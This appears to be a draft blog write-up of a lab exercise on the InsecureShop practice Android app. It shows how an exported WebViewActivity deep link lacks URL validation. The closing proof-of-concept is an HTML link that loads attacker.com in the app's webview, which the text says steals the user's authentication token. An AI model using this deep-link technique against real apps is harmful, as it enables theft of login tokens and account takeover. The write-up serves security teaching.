---
title: InsecureShop - Insufficient URL Validation
date: '2022-07-23'
tags: ['android', 'appsec', 'insecureshop']
draft: true
summary: Possible to load any arbitrary URL in webview via Deeplink
images: '/static/images/insecureshop/deeplink.jpg'
layout: PostLayout
canonicalUrl:
---

# Insufficient URL Validation

> The class `com.insecureshop.WebViewActivity` contains the following code. As per the code, the application registers a path web and a query parameter url.

First step for analysis is to identify the deep links in Manifest file.

## What are deep links?

A deep link is an intent filter system that allows users to directly interact with a specific activity in an android application.

Example of our activity definition in the manifest file.

```xml
<activity android:name="com.insecureshop.WebViewActivity">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="insecureshop" android:host="com.insecureshop"/>
    </intent-filter>
</activity>
```

`com.insecureshop.webViewActivity` is browsable meaning can be accessed from web client. This is possible through resolving the URL in the `<data>` tags.
The webview responds to the scheme of `insecureshop`. Because the webview activity is wrapped under `intent-filter`, therefore meaning it is exported and can be accessed by external applications.

```java
Intrinsics.checkExpressionValueIsNotNull(intent, "intent");
Uri uri = intent.getData();
    if (uri != null) {
        String data = null;
        data = null;
        if (StringsKt.equals$default(uri.getPath(), "/web", false, 2, null)) {
            Intent intent2 = getIntent();
            Intrinsics.checkExpressionValueIsNotNull(intent2, "intent");
            Uri data2 = intent2.getData();
            if (data2 != null) {
                data = data2.getQueryParameter("url");
            }
        } else if (StringsKt.equals$default(uri.getPath(), "/webview", false, 2, null)) {
            Intent intent3 = getIntent();
            Intrinsics.checkExpressionValueIsNotNull(intent3, "intent");
            Uri data3 = intent3.getData();
            if (data3 == null) {
                Intrinsics.throwNpe();
            }
            String queryParameter = data3.getQueryParameter("url");
            if (queryParameter == null) {
                Intrinsics.throwNpe();
            }
```

The above code checks is the url has `web` or `webview` in the URL path. We can use that to craft our attack by sending user an URL we control.

We can craft an attack as shown below.

```html
<!DOCTYPE html>
<html>
  <body style="text-align: center;">
    <h1><a href="insecureshop://com.insecureshop/webview?url=https://attacker.com/">POC</a></h1>
  </body>
</html>
```

Using the above `attack`, one is able to steal authentication token in the user's header.
